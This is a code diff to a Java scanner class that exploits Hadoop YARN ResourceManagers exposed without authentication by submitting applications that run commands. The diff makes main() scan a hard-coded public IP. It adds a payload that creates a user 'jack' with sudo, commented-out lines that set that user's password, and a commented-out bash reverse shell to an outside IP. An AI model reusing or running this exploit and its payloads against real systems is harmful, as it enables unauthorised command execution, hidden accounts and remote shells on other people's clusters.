@@ -11,6 +11,7 @@ import com.gbw.scanner.sink.SinkQueue;
 import com.gbw.scanner.utils.HttpUtils;
 import com.xmap.api.utils.TextUtils;
 import org.apache.hadoop.conf.Configuration;
+import org.apache.hadoop.fs.CommonConfigurationKeysPublic;
 import org.apache.hadoop.yarn.api.ApplicationConstants;
 import org.apache.hadoop.yarn.api.protocolrecords.GetNewApplicationResponse;
 import org.apache.hadoop.yarn.api.records.*;
@@ -166,6 +167,22 @@ public class GBWScanYarnScript implements GBWScanScript {
         }
     }
 
+    private YarnConfiguration createConf(Host host){
+
+       YarnConfiguration conf = new YarnConfiguration(new Configuration());
+       conf.set(YarnConfiguration.RM_ADDRESS, host.getServer());
+       conf.setInt(CommonConfigurationKeysPublic.IPC_CLIENT_KILL_MAX_KEY,1);
+       conf.setInt(CommonConfigurationKeysPublic.IPC_CLIENT_CONNECT_MAX_RETRIES_ON_SOCKET_TIMEOUTS_KEY,config.getIpcRetries());
+       conf.setInt(CommonConfigurationKeysPublic.IPC_CLIENT_CONNECT_MAX_RETRIES_KEY,config.getIpcRetries());
+
+       conf.setBoolean(YarnConfiguration.AUTO_FAILOVER_ENABLED,false);
+       conf.setInt(YarnConfiguration.CLIENT_FAILOVER_MAX_ATTEMPTS,1);
+       conf.setInt(YarnConfiguration.CLIENT_FAILOVER_RETRIES,0);
+       conf.setInt(YarnConfiguration.CLIENT_FAILOVER_RETRIES_ON_SOCKET_TIMEOUTS,0);
+
+       return conf;
+    }
+
     @Override
     public void scan(Host host, SinkQueue sinkQueue) {
 
@@ -174,9 +191,7 @@ public class GBWScanYarnScript implements GBWScanScript {
 
         try {
 
-            conf = new YarnConfiguration(new Configuration());
-            conf.set(YarnConfiguration.RM_ADDRESS, host.getServer());
-            conf.setLong(YarnConfiguration.YARN_CLIENT_APPLICATION_CLIENT_PROTOCOL_POLL_TIMEOUT_MS,10000);
+            conf = createConf(host);
             yarnClient = YarnClient.createYarnClient();
 
             yarnClient.init(conf);
@@ -193,7 +208,7 @@ public class GBWScanYarnScript implements GBWScanScript {
                 YarnClusterMetrics clusterMetrics = yarnClient.getYarnClusterMetrics();
 
                 log.warn(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
-               // System.out.println(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
+               //System.out.println(String.format("Find a hadoop yarn create application bugs in %s:%d ,appID:%s",host.getServer(),host.getPort(),appId.toString()));
                 GBWScanYarnResult result = new GBWScanYarnResult(config,host);
                 result.setAppID(appId.toString());
                 result.setMaxMem(appResponse.getMaximumResourceCapability().getMemorySize());
@@ -209,7 +224,7 @@ public class GBWScanYarnScript implements GBWScanScript {
             }
 
         } catch (Exception e){
-            //e.printStackTrace();
+            e.printStackTrace();
             log.error(String.format("scan yarn error:for:%s:%d message:%s",host.getServer(),host.getPort(),e.getMessage()));
         }finally {
             if(yarnClient!=null) {
@@ -290,16 +305,19 @@ public class GBWScanYarnScript implements GBWScanScript {
 
     public static void main(String[] args){
 
-        Host host = new Host("39.106.121.27","39.106.121.27",8088,null,null);
+        String ip = "154.210.72.15";
+        Host host = new Host(ip,ip,8088,null,null);
 
         GBWScanYarnConfig config = new GBWScanYarnConfig();
         config.setAppname("test");
         config.setMemory(1024);
-        config.setMonitor(false);
+        config.setMonitor(true);
         config.setPriority(1);
         config.setQueue("test");
         config.setTimeout(100000);
         config.setRunCmd(true);
+        config.setIpcRetries(2);
+
         List<String> cmds = new ArrayList<>();
 
         config.setReadTimeout(10000);
@@ -312,18 +330,24 @@ public class GBWScanYarnScript implements GBWScanScript {
         config.setKeys(keys);
 
 
-        cmds.add("touch /tmp/test.datadata");
-
+        //cmds.add("/bin/bash -i >& /dev/tcp/128.199.250.129/8088 0>&1");
+        cmds.add("sudo /usr/sbin/useradd jack");
+        /*
+        cmds.add("sh");
+        cmds.add("-c");
+        cmds.add("echo jack:123456|chpasswd");
+        */
         config.setCmds(cmds);
+
 
         config.setVcores(1);
 
         config.setUser("test");
 
         GBWScanYarnScript scanYarnScript = new GBWScanYarnScript(config);
-        System.out.println(scanYarnScript.isAccept(host));
+        //System.out.println(scanYarnScript.isAccept(host));
 
-        //scanYarnScript.scan(host,null);
+        scanYarnScript.scan(host,null);
     }
 
 }
